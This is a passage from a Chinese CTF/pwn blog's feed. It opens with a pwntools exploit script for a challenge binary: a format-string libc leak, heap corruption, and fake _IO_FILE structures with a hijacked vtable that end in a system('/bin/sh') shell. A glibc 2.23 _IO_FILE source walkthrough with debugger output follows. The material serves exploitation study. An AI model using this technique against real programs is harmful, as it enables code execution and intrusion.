class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">local = 0</span><br><span class="line">else:</span><br><span class="line">local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">sh = process(&apos;./echo_from_your_heart&apos;)</span><br><span class="line">elf = ELF(&apos;./echo_from_your_heart&apos;)</span><br><span class="line">libc = ELF(&apos;/glibc/glibc-2.24/debug_x64/lib/libc-2.24.so&apos;)</span><br><span class="line">else:</span><br><span class="line">sh = remote(&apos;&apos;,&apos;&apos;)</span><br><span class="line">elf = ELF(&apos;./echo_from_your_heart&apos;)</span><br><span class="line">#libc=ELF(&apos;&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get(size,word):</span><br><span class="line">    sh.sendlineafter(&apos;word: &apos;,str(size))</span><br><span class="line">    sh.sendlineafter(&apos;word: &apos;,word)</span><br><span class="line"></span><br><span class="line">get(0x20,&quot;%lx.&quot;*8+&quot;%lx&quot;)</span><br><span class="line">sh.recvuntil(&apos;echo: &apos;)</span><br><span class="line">for i in range(8):</span><br><span class="line">    sh.recvuntil(&apos;.&apos;)</span><br><span class="line">#print sh.recv()</span><br><span class="line">libc.base = int(&apos;0x&apos;+sh.recvuntil(&apos;\n&apos;,drop=True),16) - 0x1fcc9</span><br><span class="line">print hex(libc.base)</span><br><span class="line">io_list_all = libc.base + libc.symbols[&apos;_IO_list_all&apos;]</span><br><span class="line">system = libc.base + libc.symbols[&apos;system&apos;]</span><br><span class="line">binsh = libc.base + libc.search(&apos;/bin/sh\x00&apos;).next()</span><br><span class="line">io_str_jumps = libc.base + libc.symbols[&apos;_IO_str_jumps&apos;]</span><br><span class="line">success(&quot;binsh_addr: &quot;+hex(binsh))</span><br><span class="line">#sh.recv()</span><br><span class="line">get(0x20,&apos;a&apos;*0x20+p64(0)+p64(0xfa1))</span><br><span class="line">get(0x1000,&apos;bbbb&apos;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">fake_file = p64(0)+p64(0x61)</span><br><span class="line">fake_file += p64(0)+p64(io_list_all-0x10)  # read_end &amp; read_base</span><br><span class="line">fake_file += p64(2)+p64(3)                 # write_base &lt; write_ptr</span><br><span class="line">fake_file += p64(0)+p64(binsh)             # write_end &amp; buf_base</span><br><span class="line">fake_file += &apos;\0&apos;*0x98#fake_file.ljust(0xd8,&apos;\0&apos;)  # use ljust will be detected why?</span><br><span class="line"></span><br><span class="line">pay = fake_file </span><br><span class="line">pay += p64(io_str_jumps-8)                 # vtable_ptr</span><br><span class="line">pay += p64(0) + p64(system)</span><br><span class="line"></span><br><span class="line">fake_file2 = p64(0)+p64(0x61)</span><br><span class="line">fake_file2 += p64(0)*2</span><br><span class="line">fake_file2 += p64(0)+p64((binsh-100)/2+1)  # write_base &amp; write_ptr</span><br><span class="line">fake_file2 += p64(0)*2</span><br><span class="line">fake_file2 += p64((binsh-100)/2)           # buf_end</span><br><span class="line">fake_file2 += &apos;\0&apos;*0x60</span><br><span class="line">fake_file2 += p64(2)+p64(3)                # freeres_list &amp; freeres_buf</span><br><span class="line">fake_file2 += p64(0)*0x20</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">pay2 = fake_file2</span><br><span class="line">pay2 += p64(io_str_jumps-0x18)</span><br><span class="line"></span><br><span class="line">get(0x10,&apos;d&apos; * 0x10 + pay)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#get(0x20,&apos;a&apos;*0x20+fake_file)</span><br><span class="line">sleep(1)</span><br><span class="line">sh.sendlineafter(&apos;word: &apos;,&apos;20&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前置知识&quot;&gt;&lt;a href=&quot;#前置知识&quot; class=&quot;headerlink&quot; title=&quot;前置知识&quot;&gt;&lt;/a&gt;前置知识&lt;/h1&gt;&lt;p&gt;细节知识可以看&lt;a href=&quot;https://www.siriuswhiter.tk/2019/07/08/io-file
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="file" scheme="http://siriuswhiter.tk/tags/file/"/>
    
  </entry>
  
  <entry>
    <title>_IO_FILE 源码分析</title>
    <link href="http://siriuswhiter.tk/2019/07/08/io-file-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://siriuswhiter.tk/2019/07/08/io-file-源码分析/</id>
    <published>2019-07-08T05:33:38.000Z</published>
    <updated>2019-07-11T11:04:39.864Z</updated>
    
    <content type="html"><![CDATA[<p><em>_IO_File 是个比较神奇的东西，而且用起来比较方便，因此花点时间捋一下它的源码，方便后面的精进</em></p><p>这里使用glibc 2.23的源码进行调试，需要注意的是2.23版本之后的vtable添加了检查，这里调试的是没有检查的，加了debug symbol的glibc。源码与编译方式如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//gcc -Wl,-dynamic-linker /glibc/glibc-2.23/debug_x64/lib/ld-linux-x86-64.so.2 -o iofile -g iofile.c</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">FILE*fp1=fopen(&quot;test1&quot;,&quot;wb+&quot;);</span><br><span class="line"></span><br><span class="line">char data1[20];</span><br><span class="line">fread(data1,1,20,fp1);</span><br><span class="line"></span><br><span class="line">    FILE*fp2=fopen(&quot;test2&quot;,&quot;wb&quot;);</span><br><span class="line"></span><br><span class="line">char data2[20]=&#123;&quot;abcdefghij1234567890&quot;&#125;;</span><br><span class="line">fwrite(data2,1,20,fp2);</span><br><span class="line"></span><br><span class="line">fclose(fp1);</span><br><span class="line">    fclose(fp2);</span><br><span class="line">return 0;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h1><h2 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h2><p>malloc为结构体分配内存空间。</p><p>_IO_no_init 对FILE结构体进行初始化。</p><p>_IO_file_init将结构体链接进_IO_list_all链表。</p><p>_IO_file_fopen执行系统调用打开文件。</p><p>返回句柄。</p><h2 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h2><h3 id="fopen-gt-IO-new-fopen"><a href="#fopen-gt-IO-new-fopen" class="headerlink" title="fopen-&gt;_IO_new_fopen"></a>fopen-&gt;_IO_new_fopen</h3><p>跟进去,发现是_IO_new_fopen函数，在libio/iofopen.c中。（这里展示的不是2.23的代码，所以与下面调试时的代码会有所偏差）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">_IO_new_fopen (const char *filename, const char *mode)</span><br><span class="line">&#123;</span><br><span class="line">  return __fopen_internal (filename, mode, 1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>继续跟进__fopen_internal</p><h4 id="fopen-internal"><a href="#fopen-internal" class="headerlink" title="__fopen_internal"></a>__fopen_internal</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">__fopen_internal (const char *filename, const char *mode, int is32)</span><br><span class="line">&#123;</span><br><span class="line">  struct locked_FILE</span><br><span class="line">  &#123;</span><br><span class="line">    struct _IO_FILE_plus fp;</span><br><span class="line">#ifdef _IO_MTSAFE_IO</span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line">#endif</span><br><span class="line">    struct _IO_wide_data wd;</span><br><span class="line">  &#125; *new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));</span><br><span class="line"></span><br><span class="line">  if (new_f == NULL)</span><br><span class="line">    return NULL;</span><br><span class="line">#ifdef _IO_MTSAFE_IO</span><br><span class="line">  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;</span><br><span class="line">#endif</span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, 0, 0, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);    //对file结构体new_f进行初始化。</span><br><span class="line">  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;                             // 设置vtable为_IO_file_jumps</span><br><span class="line">  _IO_new_file_init_internal (&amp;new_f-&gt;fp);                              // 将file结构体链接进去_IO_list_all</span><br><span class="line">  if (_IO_file_fopen ((FILE *) new_f, filename, mode, is32) != NULL)</span><br><span class="line">    return __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br><span class="line"></span><br><span class="line">  _IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line">  free (new_f);</span><br><span class="line">  return NULL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到先申请了一个locked_FILE 结构体，其内部有三个结构体，分别为<em>fp = _IO_FILE_plus,</em>lock = _IO_lock_t,*wd = _IO_wide_data<br>太大了就不贴出来了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; print new_f</span><br><span class="line">$3 = (struct locked_FILE *) 0x602010</span><br><span class="line">pwndbg&gt; x/20gx 0x602010-0x10</span><br><span class="line">0x602000:0x00000000000000000x0000000000000231</span><br><span class="line">0x602010:0x00000000000000000x0000000000000000</span><br><span class="line">0x602020:0x00000000000000000x0000000000000000</span><br><span class="line">0x602030:0x00000000000000000x0000000000000000</span><br><span class="line">0x602040:0x00000000000000000x0000000000000000</span><br><span class="line">0x602050:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure></p><h5 id="IO-no-init"><a href="#IO-no-init" class="headerlink" title="_IO_no_init"></a>_IO_no_init</h5><p>继续跟进,_IO_no_init 对file结构体进行初始化。这里2.23版本是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">   _IO_no_init (&amp;new_f-&gt;fp.file, 0, 0, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);</span><br><span class="line">#else</span><br><span class="line">   _IO_no_init (&amp;new_f-&gt;fp.file, 1, 0, NULL, NULL);</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><p>进入函数内部，该函数位于/libio/genops.c中，开始时进入_IO_old_init (fp, flags)，对fp结构体部分初始化，绝大多数为空，返回后主要对fp-&gt;_wide_data结构体进行了初始化。</p><p>返回后设置vtable为_IO_file_jumps。</p><h5 id="IO-file-init"><a href="#IO-file-init" class="headerlink" title="_IO_file_init"></a>_IO_file_init</h5><p>继续运行，调用_IO_file_init (&amp;new_f-&gt;fp)，这里位于/libio/fileops.c;</p><p>将前面创建的file结构体放入_IO_list_all中。可以看到主体是调用的_IO_link_in(fp)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">_IO_file_init (struct _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  /* POSIX.1 allows another file handle to be used to change the position</span><br><span class="line">     of our file descriptor.  Hence we actually don&apos;t know the actual</span><br><span class="line">     position before we do the first fseek (and until a following fflush). */</span><br><span class="line">  fp-&gt;file._offset = _IO_pos_BAD;</span><br><span class="line">  fp-&gt;file._flags |= CLOSED_FILEBUF_FLAGS;</span><br><span class="line"></span><br><span class="line">  _IO_link_in (fp);</span><br><span class="line">  fp-&gt;file._fileno = -1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="IO-link-in"><a href="#IO-link-in" class="headerlink" title="_IO_link_in"></a>_IO_link_in</h6><p>跟进该函数,又回到了genops.c中，看到开始检查flag的标志位是否是_IO_LINKED，因为FILE结构体是通过_IO_list_all的单链表进行组织管理的，所以如果不在链表中便对其进行相应的处理，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span class="line">_IO_link_in (struct _IO_FILE_plus *fp)</span><br><span class="line">&#123;</span><br><span class="line">  if ((fp-&gt;file._flags &amp; _IO_LINKED) == 0)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;file._flags |= _IO_LINKED;</span><br><span class="line">#ifdef _IO_MTSAFE_IO</span><br><span class="line">      _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">      _IO_lock_lock (list_all_lock);</span><br><span class="line">      run_fp = (FILE *) fp;</span><br><span class="line">      _IO_flockfile ((FILE *) fp);</span><br><span class="line">#endif</span><br><span class="line">      fp-&gt;file._chain = (FILE *) _IO_list_all;</span><br><span class="line">      _IO_list_all = fp;</span><br><span class="line">#ifdef _IO_MTSAFE_IO</span><br><span class="line">      _IO_funlockfile ((FILE *) fp);</span><br><span class="line">      run_fp = NULL;</span><br><span class="line">      _IO_lock_unlock (list_all_lock);</span><br><span class="line">      _IO_cleanup_region_end (0);</span><br><span class="line">#endif</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>查看下_IO_list_all申请的结构体,即前面三个结构体中第一个结构体。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; print *_IO_list_all</span><br><span class="line">$5 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72538996, </span><br><span class="line">    _IO_read_ptr = 0x0, </span><br><span class="line">    _IO_read_end = 0x0, </span><br><span class="line">    _IO_read_base = 0x0, </span><br><span class="line">    _IO_write_base = 0x0, </span><br><span class="line">    _IO_write_ptr = 0x0, </span><br><span class="line">    _IO_write_end = 0x0, </span><br><span class="line">    _IO_buf_base = 0x0, </span><br><span class="line">    _IO_buf_end = 0x0, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x7ffff7dd6540 &lt;_IO_2_1_stderr_&gt;, </span><br><span class="line">    _fileno = -1, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = 0, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &apos;\000&apos;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x6020f0, </span><br><span class="line">    _offset = -1, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x602100, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = 0, </span><br><span class="line">    _unused2 = &apos;\000&apos; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7ffff7dd46e0 &lt;__GI__IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>函数返回到__fopen_internal中，进入一个判断<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if (_IO_file_fopen ((FILE *) new_f, filename, mode, is32) != NULL)</span><br><span class="line">    return __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br></pre></td></tr></table></figure></p><h4 id="IO-new-file-fopen"><a href="#IO-new-file-fopen" class="headerlink" title="_IO_new_file_fopen"></a>_IO_new_file_fopen</h4><p>跟进判断函数，跳转到了/libio/fileops.c中的_IO_new_file_fopen函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">_IO_new_file_fopen (FILE *fp, const char *filename, const char *mode,</span><br><span class="line">    int is32not64)</span><br></pre></td></tr></table></figure></p><p>前面先检查文件是否打开，之后设置打开模式，最后调用 _IO_file_open</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result = _IO_file_open (fp, filename, omode|oflags, oprot, read_write,</span><br><span class="line">  is32not64);</span><br></pre></td></tr></table></figure><h5 id="IO-file-open"><a href="#IO-file-open" class="headerlink" title="_IO_file_open"></a>_IO_file_open</h5><p>跟进_IO_file_open函数，可以看到，调用了系统级函数__open打开文件，之后设置fp-&gt;_fileno为文件描述符，最后再次调用_IO_link_in确保设置进入_IO_list_all。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">_IO_file_open (FILE *fp, const char *filename, int posix_mode, int prot,</span><br><span class="line">       int read_write, int is32not64)</span><br><span class="line">&#123;</span><br><span class="line">  int fdesc;</span><br><span class="line">  if (__glibc_unlikely (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL))</span><br><span class="line">    fdesc = __open_nocancel (filename,</span><br><span class="line">     posix_mode | (is32not64 ? 0 : O_LARGEFILE), prot);</span><br><span class="line">  else</span><br><span class="line">    fdesc = __open (filename, posix_mode | (is32not64 ? 0 : O_LARGEFILE), prot);</span><br><span class="line">  if (fdesc &lt; 0)</span><br><span class="line">    return NULL;</span><br><span class="line">  fp-&gt;_fileno = fdesc;</span><br><span class="line">  _IO_mask_flags (fp, read_write,_IO_NO_READS+_IO_NO_WRITES+_IO_IS_APPENDING);</span><br><span class="line">  /* For append mode, send the file offset to the end of the file.  Don&apos;t</span><br><span class="line">     update the offset cache though, since the file handle is not active.  */</span><br><span class="line">  if ((read_write &amp; (_IO_IS_APPENDING | _IO_NO_READS))</span><br><span class="line">      == (_IO_IS_APPENDING | _IO_NO_READS))</span><br><span class="line">    &#123;</span><br><span class="line">      off64_t new_pos = _IO_SYSSEEK (fp, 0, _IO_seek_end);</span><br><span class="line">      if (new_pos == _IO_pos_BAD &amp;&amp; errno != ESPIPE)</span><br><span class="line">&#123;</span><br><span class="line">  __close_nocancel (fdesc);</span><br><span class="line">  return NULL;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  _IO_link_in ((struct _IO_FILE_plus *) fp);</span><br><span class="line">  return fp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>之后返回之后调用了__fopen_maybe_mmap，之后将fp指针返回，整个流程就结束了。</p><h1 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h1><h2 id="框架-1"><a href="#框架-1" class="headerlink" title="框架"></a>框架</h2><p>如果_IO_buf_base为空，调用_IO_doallocbuf(fp)初始化指针，建立输入缓冲区</p><p>根据输入缓冲区与目标缓冲区情况分别进行处理，底层调用read的系统调用来进行读取并复制</p><h2 id="细节-1"><a href="#细节-1" class="headerlink" title="细节"></a>细节</h2><p>进入之前再查看下FILE结构体fp指针的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; print *fp</span><br><span class="line">$6 = &#123;</span><br><span class="line">  _flags = -72539008, </span><br><span class="line">  _IO_read_ptr = 0x0, </span><br><span class="line">  _IO_read_end = 0x0, </span><br><span class="line">  _IO_read_base = 0x0, </span><br><span class="line">  _IO_write_base = 0x0, </span><br><span class="line">  _IO_write_ptr = 0x0, </span><br><span class="line">  _IO_write_end = 0x0, </span><br><span class="line">  _IO_buf_base = 0x0, </span><br><span class="line">  _IO_buf_end = 0x0, </span><br><span class="line">  _IO_save_base = 0x0, </span><br><span class="line">  _IO_backup_base = 0x0, </span><br><span class="line">  _IO_save_end = 0x0, </span><br><span class="line">  _markers = 0x0, </span><br><span class="line">  _chain = 0x7ffff7dd6540 &lt;_IO_2_1_stderr_&gt;, </span><br><span class="line">  _fileno = 3, </span><br><span class="line">  _flags2 = 0, </span><br><span class="line">  _old_offset = 0, </span><br><span class="line">  _cur_column = 0, </span><br><span class="line">  _vtable_offset = 0 &apos;\000&apos;, </span><br><span class="line">  _shortbuf = &quot;&quot;, </span><br><span class="line">  _lock = 0x6020f0, </span><br><span class="line">  _offset = -1, </span><br><span class="line">  _codecvt = 0x0, </span><br><span class="line">  _wide_data = 0x602100, </span><br><span class="line">  _freeres_list = 0x0, </span><br><span class="line">  _freeres_buf = 0x0, </span><br><span class="line">  __pad5 = 0, </span><br><span class="line">  _mode = 0, </span><br><span class="line">  _unused2 = &apos;\000&apos; &lt;repeats 19 times&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="fread-gt-IO-fread"><a href="#fread-gt-IO-fread" class="headerlink" title="fread-&gt;_IO_fread"></a>fread-&gt;_IO_fread</h3><p>跟进fread函数，看到是位于/libio/fread.c中的_IO_fread,看到先计算了请求字节数，之后对fp加锁，执行_IO_sgetn，之后释放锁。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">size_t</span><br><span class="line">_IO_fread (void *buf, size_t size, size_t count, FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  size_t bytes_requested = size * count;</span><br><span class="line">  size_t bytes_read;</span><br><span class="line">  CHECK_FILE (fp, 0);</span><br><span class="line">  if (bytes_requested == 0)</span><br><span class="line">    return 0;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  return bytes_requested == bytes_read ? count : bytes_read / size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="IO-sgetn-gt-IO-XSGETN"><a href="#IO-sgetn-gt-IO-XSGETN" class="headerlink" title="_IO_sgetn ==&gt; _IO_XSGETN"></a>_IO_sgetn ==&gt; _IO_XSGETN</h4><p>可以看到主体应该是_IO_sgetn函数，跟进该函数,发现主体为_IO_XSGETN函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">size_t</span><br><span class="line">_IO_sgetn (FILE *fp, void *data, size_t n)</span><br><span class="line">&#123;</span><br><span class="line">  /* FIXME handle putback buffer here! */</span><br><span class="line">  return _IO_XSGETN (fp, data, n);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_sgetn)</span><br></pre></td></tr></table></figure></p><p>查看定义<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N)</span><br></pre></td></tr></table></figure></p><p>继续跟进，进入/libio/fileops.c，该函数较长，做了不少事情。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">size_t</span><br><span class="line">_IO_file_xsgetn (FILE *fp, void *data, size_t n)</span><br></pre></td></tr></table></figure></p><p>如果_IO_buf_base为空，调用_IO_doallocbuf(fp)初始化指针，建立输入缓冲区<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if (fp-&gt;_IO_buf_base == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      /* Maybe we already have a push back pointer.  */</span><br><span class="line">      if (fp-&gt;_IO_save_base != NULL)</span><br><span class="line">&#123;</span><br><span class="line">  free (fp-&gt;_IO_save_base);</span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;</span><br><span class="line">&#125;</span><br><span class="line">      _IO_doallocbuf (fp);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><h5 id="第一步：-IO-doallocbuf"><a href="#第一步：-IO-doallocbuf" class="headerlink" title="第一步：_IO_doallocbuf"></a>第一步：_IO_doallocbuf</h5><p>跟进_IO_doallocbuf,进入/libio/genops.c<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">void</span><br><span 